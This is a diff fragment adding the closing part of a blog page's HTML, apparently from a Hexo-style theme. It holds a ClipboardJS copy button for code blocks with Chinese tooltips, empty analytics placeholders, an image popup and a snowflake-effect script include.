+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+    console.log('1')
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+      setTimeout(()=>{
+        e.trigger.setAttribute('aria-label', "复制到粘贴板!");
+      },1500)
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    <div class="img-pup" style="display: none;"> 
+      <img>
+    </div>
+<!-- 雪花特效2 -->
+
+  <script type="text/javascript" src="/js/snow.js"></script>
+
+</body>
+</html>
